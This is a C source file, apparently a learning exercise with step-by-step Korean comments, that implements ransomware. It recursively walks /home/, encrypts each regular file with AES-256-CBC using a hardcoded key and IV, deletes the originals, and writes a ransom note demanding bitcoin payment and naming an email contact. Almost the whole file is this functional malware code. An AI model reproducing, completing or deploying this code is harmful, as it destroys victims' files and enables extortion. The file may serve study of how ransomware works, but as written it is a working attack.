#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>


void ls_dir(char* start_path);
void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);


int main()
{
   
	
	char* start_path;										  //start_path라는 char형 포인터만듬
	start_path = "/home/";  //그안에 /home/ 을 넣음
    ls_dir(start_path);

    return 0;
}

void ls_dir(char* start_path)// ls_dir은 char형 포인터를 하나받아서 반환없음
{
	unsigned char key[] = "12345678901234561234567890123456";	   // 32 char 256bit key 부호없는 char형 변수로 key배열 만들고 그안에 문자32개넣음
    unsigned char iv[] = "1234567890123456";					   //same size as block 16 char 128 bit block 부호없는 char형 변수로 iv배열만들고 그안에 문자 16개넣음  

	DIR* dir;											   //dirent.h에 있는 dir구조체로 dir포인터 선언
	struct dirent *ent;									   //*dirent 개방한 파일의 정보를 저장할 구조체 변수
	if((dir=opendir(start_path)) !=NULL)					  //start_path(/home/)을 열고 dir에 넣는다 성공해서 NULL이 아닌값이 반환됬다면 if문진입
	{
		while((ent=readdir(dir)) !=NULL)					   //연 디렉토리를 읽어서 ent에 넣음
		{
			int len = strlen(ent->d_name);				   //디렉토리의 이름의 길이 len에 저장
			const char* last_four = &ent->d_name[len-4];		   //마지막 확장자를 가져와 넣음
			if(strcmp(last_four,".enc") != 0)				   //만약 확장자가 .enc가 아니면 진입
			{
				if(ent->d_type == 8)					   //reg파일이면
				{
					char* full_path_readme =(char*) malloc(strlen("RANSOMEWARE_INFO")+strlen(start_path)+2);		//char를 만들어서 랜섬웨어정보의 길이와 /home/+2만큼 동적할당
					strcpy(full_path_readme,start_path);						  //만든거에 /home/넣고
					strcat(full_path_readme,"RANSOMEWARE_INFO");					  //랜섬웨어정보를 뒤에붙임
					char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);	//full_path라는걸 새로만들고 폴더명+/home/+2만큼 동적할당
					strcpy(full_path,start_path);				  ///home/넣고
					strcat(full_path,ent->d_name);			  //그뒤에 폴더명넣음
					char* new_name = (char*) malloc(strlen(full_path)+strlen(".enc")+1);	 //new_name만들고 /home/폴더명 + .enc+1만큼 동적할당
					strcpy(new_name,full_path);							   //full_path넣고
					strcat(new_name,".enc");						 //.enc넣음
					if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)  
					{		 //만약 full_path가 /etc/passwd와 다르고 /etc/shadow도 아니고 etc/sudoers도 아니면
						FILE* fpin;	   
						FILE* fpout;
						FILE* fpreadme;
					
						
						fpin=fopen(full_path,"rb");		   //full_path를 (/home/폴더명)을 바이너리파일로 읽기위해 연다
						fpout=fopen(new_name,"wb");		   //new_name을(/home/폴더명.enc 를 쓰기위해 바이너리파일로연다 
						fpreadme=fopen(full_path_readme,"w");	//full_path_readme를 쓰기위해연다.   
						
						fprintf(fpreadme,"You have been PWNED! \n\n Hear me ROAR All files belong to me and are in an encrypted state. I have but two simple commands.\n\n 1. Tranfer money to my bitcoin address \n 2. Email me with your bitcoin address that you used to send the money. Then I will email with an antidote \n\n Pay me Now! \n My Bitcoin Address:Xg7665tgf677hhjhjhhh\n Email:xxxyy@yandex.ru \n");
						fclose(fpreadme);			//fpreadme에 요구하는사항을 쓰고 닫는다.
						
						encryptfile(fpin,fpout,key,iv);

						fclose(fpin);
						fclose(fpout);
						remove(full_path);
					}
					free(full_path);
					free(new_name);
				}
				else if(ent->d_type==4)			 //파일이 dir이면
				{

					char *full_path=(char*) malloc(strlen(start_path)+strlen(ent->d_name)+2);
					strcpy(full_path,start_path);
					strcat(full_path,ent->d_name);
					strcat(full_path,"/");
					printf("%s\n",full_path);
					if(full_path != start_path && ent->d_name[0] != '.')
					{
						ls_dir(full_path);
					}
					
					free(full_path);


				}

			}
		}
	}

}
void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv)
{
	//Using openssl EVP to encrypt a file

	
	const unsigned bufsize = 4096;				 
	unsigned char* read_buf = malloc(bufsize);
	unsigned char* cipher_buf ;
	unsigned blocksize;
	int out_len;

	EVP_CIPHER_CTX ctx;

	EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,1);			//AES256 암호화사용해서 컨텍스크 ctx에 암호화 초기화
	blocksize = EVP_CIPHER_CTX_block_size(&ctx);			    //EVP_CIPHER_CTX구조를 전달할 때 암호의 블록 크기반환
	cipher_buf = malloc(bufsize+blocksize);				    //cipher_buf에 4096+블럭사이즈 동적할당

	// read file and write encrypted file until eof
	while(1)
	{
		int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);		   //fpin(full_path)에서 읽어온다. 데이터 하나의크기는 u.c, bufsize(4096)개읽음, read_buf 에 데이터입력 , 데이터 수(buf_size)만큼 반환
		EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);			   //버퍼에서 암호화하고 암호화된버전을 out에쓴다.
		fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);				   //fpout에 쓴다. out_len길이만큼, 데이터하나의크기는 u.c, cipher_buf에 있는 내용을
		if(bytes_read < bufsize)
		{
			break;//EOF
		}
	}

	EVP_CipherFinal(&ctx,cipher_buf,&out_len);
	fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);

	free(cipher_buf);
	free(read_buf);
}